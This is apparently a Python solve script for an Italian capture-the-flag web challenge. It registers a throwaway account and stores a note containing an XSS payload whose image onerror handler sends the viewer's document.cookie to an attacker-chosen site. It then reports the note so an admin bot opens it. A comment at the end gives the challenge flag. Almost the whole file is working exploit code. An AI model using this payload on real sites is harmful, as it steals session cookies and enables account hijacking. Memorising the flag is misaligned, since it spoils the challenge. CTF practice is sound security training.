#!/usr/bin/env python3
import requests, re, os

SITE = "http://debug_disabilitato.challs.olicyber.it/"
mySITE = input("Enter your site: ")
USERNAME, PASSWORD = os.urandom(8).hex(), os.urandom(8).hex()
REGEX = r'get_note\/.*?"'
PAYLOAD = f"""
<img id="debug" src="ohnononfunzia" onerror="window.location.href = '{mySITE}?' + document.cookie">
""".strip()
s = requests.Session()

s.post(SITE + "register", data={"username": USERNAME, "password": PASSWORD})
s.post(SITE + "login", data={"username": USERNAME, "password": PASSWORD})

r = s.post(SITE + "add_note", data={"title":"exploit", "content":PAYLOAD})
site = re.findall(REGEX, r.text)[0].replace('"','').replace("get_note/","")
s.post(SITE + "report", data={"report_id" : site})
print("Check your site") # flag{m36l10_r1mu0v3r3_1l_d3bu6_1n_pr0duz10n3}